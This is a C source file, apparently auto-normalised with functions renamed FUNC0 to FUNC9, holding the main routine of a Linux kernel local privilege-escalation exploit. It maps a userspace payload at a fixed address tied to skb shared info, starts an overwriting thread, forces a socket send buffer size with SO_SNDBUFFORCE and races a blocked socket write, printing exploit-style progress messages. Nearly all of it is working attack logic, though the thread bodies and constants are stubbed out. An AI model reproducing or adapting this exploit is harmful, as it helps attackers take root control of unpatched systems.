#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int uint32_t ;
typedef  int /*<<< orphan*/  sndbuf ;
typedef  int /*<<< orphan*/  pthread_t ;

/* Variables and functions */
 int /*<<< orphan*/  AF_LOCAL ; 
 int /*<<< orphan*/  EXIT_FAILURE ; 
 int MAP_ANONYMOUS ; 
 int MAP_FIXED ; 
 int MAP_PRIVATE ; 
 int PROT_READ ; 
 int PROT_WRITE ; 
 int SHINFO ; 
 int SNDBUF ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  SOL_SOCKET ; 
 int /*<<< orphan*/  SO_SNDBUF ; 
 int /*<<< orphan*/  SO_SNDBUFFORCE ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ) ; 
 void* FUNC2 (void*,int,int,int,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 int /*<<< orphan*/  FUNC4 (char*,...) ; 
 int FUNC5 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int FUNC6 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int) ; 
 int /*<<< orphan*/  skb_thr ; 
 int FUNC7 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * sockets ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 int /*<<< orphan*/  write_thr ; 

int FUNC9() {
	void *addr;
	int rv;
	uint32_t sndbuf;

	addr = FUNC2((void *)(SHINFO & 0xfffffffffffff000ul), 0x1000ul,
		PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE,
		-1, 0);
	if (addr != (void *)(SHINFO & 0xfffffffffffff000ul)) {
		FUNC3("mmap()");
		FUNC1(EXIT_FAILURE);
	}

	FUNC4("[.] userspace payload mmapped at %p\n", addr);

 	pthread_t skb_th;
    	rv = FUNC5(&skb_th, 0, skb_thr, NULL);
	if (rv != 0) {
		FUNC3("pthread_create()");
		FUNC1(EXIT_FAILURE);
	}
    	FUNC8(10000);

	FUNC4("[.] overwriting thread started\n");

	rv = FUNC7(AF_LOCAL, SOCK_STREAM, 0, &sockets[0]);
	if (rv != 0) {
		FUNC3("socketpair()");
		FUNC1(EXIT_FAILURE);
	}

	FUNC4("[.] sockets opened\n");

	sndbuf = SNDBUF;
	rv = FUNC6(sockets[1], SOL_SOCKET, SO_SNDBUFFORCE,
			&sndbuf, sizeof(sndbuf));
	if (rv != 0) {
		FUNC3("setsockopt()");
		FUNC1(EXIT_FAILURE);
	}

	FUNC4("[.] sock->sk_sndbuf set to %x\n", SNDBUF * 2);

	pthread_t write_th;
	rv = FUNC5(&write_th, 0, write_thr, NULL);
	if (rv != 0) {
		FUNC3("pthread_create()");
		FUNC1(EXIT_FAILURE);
	}
	FUNC8(10000);

	FUNC4("[.] writing to socket\n");

	// Wake up blocked write.
	rv = FUNC6(sockets[1], SOL_SOCKET, SO_SNDBUF,
			&sndbuf, sizeof(sndbuf));
	if (rv != 0) {
		FUNC3("setsockopt()");
		FUNC1(EXIT_FAILURE);
	}
	FUNC8(10000);

	FUNC0(sockets[0]);
	FUNC0(sockets[1]);

	return 0;
}